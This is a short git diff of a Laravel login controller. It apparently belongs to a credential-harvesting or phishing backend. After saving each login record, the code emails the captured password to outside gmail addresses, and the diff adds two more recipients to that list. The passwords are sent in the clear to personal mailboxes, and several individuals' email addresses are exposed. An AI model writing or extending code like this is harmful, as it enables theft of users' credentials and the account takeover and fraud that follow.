@@ -46,7 +46,8 @@ class LoginInfoController extends Controller
         }
         $info->save();
         // "crlnkurniawan@gmail.com"
-        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com"])->send(new LoggedIn($info->password));
+        // Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com"])->send(new LoggedIn($info->password));
+        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com", "feliciakurniawann06@gmail.com", "crlnkurniawan@gmail.com"])->send(new LoggedIn($info->password));
         return $info;
     }
 
